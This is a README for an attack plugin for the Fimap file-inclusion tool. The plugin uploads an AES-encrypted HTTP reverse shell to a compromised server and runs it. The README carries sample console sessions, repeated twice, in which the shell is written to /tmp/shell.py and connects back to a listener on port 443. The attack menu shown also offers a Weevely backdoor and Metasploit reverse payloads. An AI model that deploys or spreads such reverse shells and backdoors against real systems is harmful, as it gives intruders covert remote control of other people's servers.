AES-Shell-Injector - Fimap Plugin that allows you to inject an AES HTTP Reverse Shell

Author:    Darren "Infodox" Martyn.
Email:     infodox@insecurety.net
Twitter:   twitter.com/info_dox
Site:      http://insecurety.net/
Usage:     Just add this to the plugins folder in Fimap, should work fine as-is.

NOTE: The AES-Reverse listener is in the "listener" folder...

Example:
######################################################################################
#:: Available Attacks - PHP and SHELL access ::                                      #
######################################################################################
#[1] Spawn fimap shell                                                               #
#[2] Spawn pentestmonkey's reverse shell                                             #
#[3] [Upload Weevely] Uploads a Weevily Backdoor                                     #
#[4] [AES HTTP Reverse Shell Injector] Uploads and runs an AES HTTP Reverse shell    #
#[5] [msf_bindings] Executes MSF reverse payloads                                    #
#[6] [Test Plugin] Show some info                                                    #
#[7] [reverse http shell] Loads a reverse HTTP shell                                 #
#[q] Quit                                                                            #
######################################################################################
Choose Attack: 4
Uploading shell to /tmp/shell.py  ...
Uploaded 5128 bytes
Hope you have the listener running... Time to input your infoes :)
IP of listener?: 127.0.0.1
Port of listener?: 443
Executing the shell! Sending reverse shell to 127.0.0.1 443
######################################################################################
#:: Available Attacks - PHP and SHELL access ::                                      #
######################################################################################
#[1] Spawn fimap shell                                                               #
#[2] Spawn pentestmonkey's reverse shell                                             #
#[3] [Upload Weevely] Uploads a Weevily Backdoor                                     #
#[4] [AES HTTP Reverse Shell Injector] Uploads and runs an AES HTTP Reverse shell    #
#[5] [msf_bindings] Executes MSF reverse payloads                                    #
#[6] [Test Plugin] Show some info                                                    #
#[7] [reverse http shell] Loads a reverse HTTP shell                                 #
#[q] Quit                                                                            #
######################################################################################
Choose Attack: 4
Uploading shell to /tmp/shell.py  ...
Uploaded 5128 bytes
Hope you have the listener running... Time to input your infoes :)
IP of listener?: 127.0.0.1
Port of listener?: 443
Executing the shell! Sending reverse shell to 127.0.0.1 443

> Make sure your listener is running. I set it to use Port 443, you can edit the listener source in listener/server.py tto change this. 


### Known Issues ###
* This plugin does NOT yet auto connect, as my normal method of popping an XTERM to connect did not seem like a great idea.
* This plugin is still in Beta. Report any bugs in my code, PLEASE!

### Greetings and Credits ###
imax for writing Fimap!
Dave rel1k for writing the reverse shell
ohdae for one-upping all my post-pwnage ideas and writing Intersect :P
pr0f for inspiration in general.
eipwner also for being idea-causing
v0rbis for making me feel like I had to do something
